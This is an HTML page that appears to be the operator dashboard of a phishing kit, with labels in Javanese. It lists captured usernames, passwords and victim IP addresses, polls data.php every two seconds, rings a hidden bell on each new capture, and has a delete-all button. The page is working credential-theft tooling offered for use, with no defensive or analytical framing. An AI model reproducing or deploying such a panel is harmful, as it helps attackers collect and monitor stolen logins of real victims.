<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>gen Manceng Iwak</title>
	<link rel="shortcut icon" href="./favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <link rel="stylesheet" href="//cdn.datatables.net/1.10.19/css/dataTables.bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="./lib/style.css">
    <script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js" type="text/javascript"></script>
    <script type="text/javascript" src="//cdn.datatables.net/1.10.19/js/jquery.dataTables.min.js"></script>
	<script type="text/javascript" src="//cdn.datatables.net/1.10.19/js/dataTables.bootstrap.min.js"></script>
	<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>
<body><center>
    <body style="padding-top:50px;">
	<div class="container" style="width: ">
	<div class="panel panel-default">
	<div class="panel-body">
	    <a href="./genz" class="btn btn-danger" style="cursor: pointer;">genz</a></p>
<table border="0" cellspacing="0" cellpadding="0" align="center" style="width: 1000px;">
<tbody>
    </table>
	</form>
		<thead>
		    <table id="ngelead" class="demo-table" style="text-align: center;">
             <thead>
             <tr bgcolor="#2cb510">
             <td style="color: black; height: 22px;" align="center""><b>No</th>
			<td style="color: black; height: 22px;" align="center""><b>Username</th>
			<td style="color: black; height: 22px;" align="center""><b>Password</th>
			<td style="color: black; height: 22px;" align="center""><b>Ip Addres</th>
			<td style="color: black; height: 22px;" align="center""><b>Actions</th>
			<td style="color: black; height: 22px;" align="center""><b><b><center><a href="del.php"><button class='btn btn-xs btn-danger'>Hapos Kabeh</button></th>
			 </tr>
		     </thead>
                <tbody id="iyo"></tbody>
            </table>
        </div>
    </div>
</div>
<audio id="jaran" controls style="display: none;">
  <source src="lib/bell_ring.aac" type="audio/aac">
  <source src="lib/bell_ring.mp3" type="audio/mp3">
</audio>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.0/jquery.min.js"></script>
<script type="text/javascript">
var lastResponse = '';
setInterval(function(){ 
  $.ajax({
    type: "GET",
    url: "data.php",
    dataType: "html",
    success: function(response) {
      if (lastResponse && response !== lastResponse) {
        var audio = document.getElementById('jaran');
        audio.play();
        $("#iyo").load("data.php");
      }
      lastResponse = response
    }
  });
}, 2000);

$(document).ready(function(){
    $("#iyo").load("data.php");
});
</script>
<br></br>